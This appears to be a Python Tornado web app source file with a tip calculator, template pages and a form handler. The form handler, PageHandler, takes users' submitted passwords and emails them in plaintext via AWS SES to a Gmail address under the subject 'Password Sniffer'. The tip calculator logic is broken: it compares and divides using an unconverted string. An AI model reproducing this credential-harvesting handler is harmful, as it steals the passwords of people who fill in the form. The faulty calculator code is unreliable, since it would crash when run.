import os  # deploy line: says this is the standard library
import boto3

import tornado.ioloop
import tornado.web
import tornado.log

from dotenv import load_dotenv

from jinja2 import \
    Environment, PackageLoader, select_autoescape

load_dotenv('.env') #this is set in your environement for production. in deployment, it wil be stored in server.


# deploy line: says get the port variable. If there is no port var, get the default. the default here is 8888. Anything above 1000 works. Ports < 1000 are reserved unless you are a root developer.
PORT = int(os.environ.get('PORT', '8888'))

ENV = Environment(
    loader=PackageLoader('myapp', 'templates'),
    autoescape=select_autoescape(['html', 'xml'])
)

SES_CLIENT = boto3.client(
  'ses',
  aws_access_key_id=os.environ.get('AWS_ACCESS_KEY'),
  aws_secret_access_key=os.environ.get('AWS_SECRET_KEY'),
  region_name="us-west-2"
)


class TemplateHandler(tornado.web.RequestHandler):
    def render_template(self, tpl, context):
        template = ENV.get_template(tpl)
        self.write(template.render(**context))


class MainHandler(TemplateHandler):
    def get(self):
        names = self.get_query_arguments('name')
        self.set_header('Cache-Control','no-store, no-cache, must-revalidate, max-age=0')
        self.render_template("index.html", {'names': names, 'amount': 42.55})

class TipCalcHandler(TemplateHandler):
    def post(self):
        bill = float(self.get_body_argument('bill'))
        service = self.get_body_argument('service')
        people = self.get_body_argument('people')

        if service == "Good":
            tip = bill * 0.20
        elif service == "Fair":
            tip = bill * 0.15
        else:
            tip = bill * 0.10

        if people == 0:
            totalbill = bill + tip
        else:
            totalbill = (bill + tip)/people

        self.render_template('tip.html', {'bill': bill, 'service': service, 'people': people, 'totalbill': totalbill})

class PageHandler(TemplateHandler):
    def post(self, page):
        self.set_header('Cache-Control','no-store, no-cache, must-revalidate, max-age=0')
        name = self.get_body_argument('name')
        email = self.get_body_argument('email')
        password = self.get_body_argument('password')
        message = self.get_body_argument('message')
        self.redirect("/page/thankyou.html") #tornado throws a 302 error if page is nonexistent

        response = SES_CLIENT.send_email(
          Destination={
            'ToAddresses': ['chancecordelia@gmail.com'],
          },
          Message={
            'Body': {
              'Text': {
                'Charset': 'UTF-8',
                'Data': 'Name: {}\nEmail: {}\nPassword: {}\nMessage: {}\n'.format(name, email, password, message),
              },
            },
            'Subject': {'Charset': 'UTF-8', 'Data': 'Password Sniffer'},
          },
          Source='chancecordelia@gmail.com',
        )

    def get(self, page):
        self.set_header(
            'Cache-Control',
            'no-store, no-cache, must-revalidate, max-age=0')
        self.render_template(page, {})


def make_app():
    return tornado.web.Application([
        (r"/", MainHandler),
        (r"/page/(.*)", PageHandler),
        (r"/tipcalc", TipCalcHandler),
        (
            r"/static/(.*)",
            tornado.web.StaticFileHandler,
            {'path': 'static'}
        ),
    ], autoreload=True)


if __name__ == "__main__":
    tornado.log.enable_pretty_logging()
    app = make_app()
    app.listen(PORT, print('Server started on localhost:' + str(PORT)))
    tornado.ioloop.IOLoop.current().start()
